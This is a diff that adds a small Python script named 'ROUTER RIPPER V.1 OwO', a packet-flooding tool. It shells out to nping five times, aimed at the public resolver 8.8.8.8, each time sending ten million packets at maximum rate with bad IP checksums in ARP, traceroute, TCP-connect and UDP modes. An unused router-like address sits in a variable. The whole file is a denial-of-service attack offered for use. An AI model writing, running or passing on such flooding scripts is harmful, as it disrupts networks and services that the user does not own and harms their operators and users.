@@ -1,0 +1,18 @@
+import socket
+import os
+clear = lambda: os.system('clear')
+clear()
+print("ROUTER RIPPER V.1 OwO")
+print("")
+print("")
+f = ("192.68.2.1")
+l = ("nping " + '8.8.8.8' + " -v4 -d3 -H -c 10000000 --arp --rate 999999999 --badsum-ip")
+os.system(l)
+l1 = ("nping " + "8.8.8.8" + " -v4 -d3 -H -c 10000000 --tr --rate 999999999 --badsum-ip")
+os.system(l1)
+l2 = ("nping " + "8.8.8.8" + " -v4 -d3 -H -c 10000000 --tcp-connect --rate 999999999 --badsum-ip")
+os.system(l2)
+l3 = ("nping " + "8.8.8.8" + " -v4 -d3 -H -c 10000000 --tr --rate 999999999 --badsum-ip")
+os.system(l3)
+l4 = ("nping " + "8.8.8.8" + " -v4 -d3 -H -c 10000000 --udp --rate 999999999 --badsum-ip")
+os.system(l4)
